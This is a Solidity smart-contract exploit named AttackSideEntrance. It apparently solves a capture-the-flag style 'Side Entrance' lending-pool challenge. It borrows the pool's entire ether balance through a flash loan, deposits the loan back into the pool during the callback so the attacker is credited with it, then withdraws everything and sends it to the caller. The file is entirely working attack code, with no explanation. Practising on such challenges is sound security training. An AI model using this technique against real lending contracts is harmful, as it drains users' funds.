// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver { 

    SideEntranceLenderPool slp;
    //uint tokens_in_pool;

    constructor (address _slp) {
        slp = SideEntranceLenderPool(_slp);
      //  tokens_in_pool = _tokens_in_pool;
    }

    function execute() override external payable {
        slp.deposit{value: msg.value}();
    }

    function drain() public returns (bool) {
        uint tokens_in_pool = address(slp).balance;
        slp.flashLoan(tokens_in_pool);
        slp.withdraw();
        (bool success, ) = payable(msg.sender).call{value : address(this).balance }("");
        return success;
    }

}